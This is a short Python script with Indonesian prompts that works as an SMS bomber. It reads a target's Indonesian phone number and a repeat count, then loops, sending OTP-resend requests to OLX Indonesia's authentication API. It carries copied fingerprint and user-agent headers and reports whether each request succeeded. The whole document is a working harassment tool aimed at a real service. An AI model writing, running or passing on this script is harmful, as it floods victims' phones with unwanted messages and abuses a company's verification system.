import requests, json
ses=requests.Session()

print("masukan nomer dengan awalan 8**********")
nomer = input("masukan nomer : ")
jumlah = int(input("masukan limit : "))
for z in range(jumlah):
	data = json.dumps({
		"grantType": "retry",
		"method": "sms",
		"phone": f"62{nomer}",
		"language": "id"})
	headers={
		"accept": "*/*",
		"content-type": "application/json",
		"x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
		"x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
		"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}
	post = ses.post("https://www.olx.co.id/api/auth/authenticate",data=data,headers=headers)
	if "PENDING" in post.text:
		print("berhasil")
	else:
		print("gagal, mungkin harus kasih delay")
